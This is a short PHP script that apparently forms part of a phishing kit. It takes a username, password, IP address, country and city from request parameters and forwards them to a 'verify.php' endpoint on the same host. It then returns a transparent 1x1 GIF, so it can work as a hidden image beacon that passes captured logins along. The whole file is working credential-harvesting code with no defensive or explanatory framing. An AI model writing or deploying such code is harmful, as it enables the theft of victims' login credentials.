<?php
// ============================================
// PROCESSOR - Forward data to verify.php
// ============================================

$u = $_GET['u'] ?? $_POST['u'] ?? '';
$p = $_GET['p'] ?? $_POST['p'] ?? '';
$ip = $_GET['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';

// Forward to verify.php on the same domain
$forward_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/app/verify.php';
$forward_url .= '?u=' . urlencode($u) . '&p=' . urlencode($p) . '&ip=' . urlencode($ip) . '&country=' . urlencode($country) . '&city=' . urlencode($city);

// Use cURL or file_get_contents
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $forward_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
} else {
    @file_get_contents($forward_url);
}

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
